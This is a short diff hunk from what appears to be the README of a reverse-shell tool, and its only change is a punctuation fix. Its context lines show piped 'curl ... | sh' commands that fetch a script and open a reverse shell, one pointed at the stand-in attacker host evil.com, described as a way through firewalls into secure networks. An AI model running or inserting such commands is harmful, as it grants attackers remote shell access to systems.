@@ -51,7 +51,7 @@ curl https://reverse-shell.sh/localhost:1337 | sh
 
 Because this is a reverse connection it can punch through firewalls and connect to the internet.
 
-You could listen for connections on a server at evil.com and get a reverse shell from inside a secure network with.
+You could listen for connections on a server at evil.com and get a reverse shell from inside a secure network with:
 
 ```shell
 curl https://reverse-shell.sh/evil.com:1337 | sh
